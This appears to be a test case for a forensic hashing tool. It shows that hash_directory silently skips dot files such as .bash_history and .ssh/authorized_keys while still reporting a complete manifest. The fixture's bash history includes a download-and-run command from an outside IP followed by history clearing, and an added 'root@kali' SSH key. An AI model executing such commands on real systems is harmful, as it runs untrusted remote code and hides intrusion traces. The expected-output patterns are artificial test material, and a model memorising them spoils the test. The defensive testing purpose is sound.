# Matrix case P1042-009: hash_directory walks the folder with _iter_files,
# which drops every file and folder whose name starts with a dot (and links)
# before the caps are checked, and puts none of them in `skipped` or
# `errors`. A Linux home folder hashed this way comes back as a complete
# manifest without .bash_history and .ssh/authorized_keys, the two files an
# intrusion on a Linux host is usually traced through.
# Evidence: the home folder of a web server's service user as collected from
# the host: a bash history with a download-and-run line, an authorized_keys
# file with an added ed25519 key, and one ordinary file.
case_id: P1042-009
problem: P1042
server: trudi
variant: trudi-88fbca7
commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
display: multi-call
level: mcp
realism: common
realism_ko: "리눅스 홈 폴더를 통째로 해시해 두는 것은 흔한 절차이고, `.bash_history`, `.ssh/authorized_keys` 같은 점 파일은 거의 모든 홈 폴더에 있다."
coverage: "partial: dot files and dot folders are shown; symbolic links, also left out of the walk, are not"
coverage_ko: 점으로 시작하는 파일과 폴더가 빠지는 것만 보인다. 같은 순회에서 빠지는 링크 파일은 넣지 않았다.
summary: hash_directory on a home folder holding .bash_history, .ssh/authorized_keys and notes.txt returns success with file_count 1 (notes.txt only), empty skipped and errors and truncated false, while hash_file on .bash_history in the same folder hashes it normally.
summary_ko: "`.bash_history`, `.ssh/authorized_keys`, `notes.txt`가 든 홈 폴더에 `hash_directory`를 부르면 `file_count` 1(`notes.txt`만)에 `skipped`, `errors`가 비고 `truncated` false인 성공 응답을 돌려준다. 같은 폴더의 `.bash_history`는 `hash_file`로 정상 해시된다."
defect_ko: "이 서버는 디렉터리 해시에서 점으로 시작하는 파일과 폴더를 아무 표시 없이 빼고, 빠진 파일을 `skipped`나 `errors`에 적지 않는다. 모든 파일을 해시하거나, 뺀 파일과 그 이유를 응답에 적어야 한다. 모델은 이 목록을 폴더 전체의 해시 목록으로 알고, 침입 흔적이 남는 `.bash_history`와 `authorized_keys`의 해시가 없다는 것을 모른다."
setup_ko: "웹 서버 서비스 계정의 홈 폴더(다운로드 후 실행한 기록이 든 `.bash_history`, 공격자 키가 더해진 `.ssh/authorized_keys`, 일반 파일 `notes.txt`)를 증거로 두고 `hash_directory`와 `hash_file`을 부른다."
fixture:
- path: cases/LNX-WEB01/analysis
  root: outside
  dir: true
- path: home/deploy/.bash_history
  text: "cd /var/www/html\ngit pull origin main\nsudo systemctl restart nginx\ncurl -s http://203.0.113.7/k.sh -o /tmp/.k.sh\nbash /tmp/.k.sh\nrm -f /tmp/.k.sh\nhistory -c\n"
  mtime: "2026-11-19T03:12:44Z"
- path: home/deploy/.ssh/authorized_keys
  text: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIb3n0x1V0tQ5rZr3m6l0dGJ4m2kq8xY3s9pF2aWcV7d deploy@ci-runner\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK9qv2Zt7cX1nB4yR8sLm0wP3eD6fH5jT2uA1gN9oQ4z root@kali\n"
  mtime: "2026-11-19T03:13:02Z"
- path: home/deploy/notes.txt
  text: "release checklist: bump version, run migrations, restart nginx\n"
  mtime: "2026-10-02T09:00:00Z"
steps:
- tool: misc_start_execution_log
  note_ko: "준비: 사건 기록을 연다"
  args:
    case_id: LNX-WEB01
    output_path: ${OUTSIDE}/cases/LNX-WEB01/analysis/LNX-WEB01_trace.json
    case_dir: ${OUTSIDE}/cases/LNX-WEB01
    launch_dashboard: false
- tool: hash_directory
  note_ko: "결함 호출: 홈 폴더 전체를 해시한다"
  args:
    directory: ${EVIDENCE}/home/deploy
- tool: hash_file
  note_ko: "비교 호출: 같은 폴더의 `.bash_history`를 따로 해시한다"
  args:
    file_path: ${EVIDENCE}/home/deploy/.bash_history
expect:
- step: 2
  note_ko: 파일 세 개 가운데 하나만 해시한 성공 응답이다
  regex: '"success": true, "directory": "[^"]*/home/deploy", "algorithm": "sha256", "file_count": 1, "hashes": \[\{"file": "[^"]*/home/deploy/notes.txt"'
- step: 2
  note_ko: 빠진 두 파일이 `errors`, `skipped`에 없다
  contains: '"errors": [], "skipped": []'
- step: 2
  note_ko: 잘림 표시도 없다
  contains: '"truncated": false'
- step: 2
  note_ko: 응답 어디에도 `.bash_history`가 없다
  not_contains: .bash_history
- step: 3
  note_ko: "`.bash_history`는 읽을 수 있는 파일이라 `hash_file`로는 정상 해시된다"
  regex: '"success": true, "file": "[^"]*/home/deploy/.bash_history", "size_bytes": \d+, "md5": "[0-9a-f]{32}"'
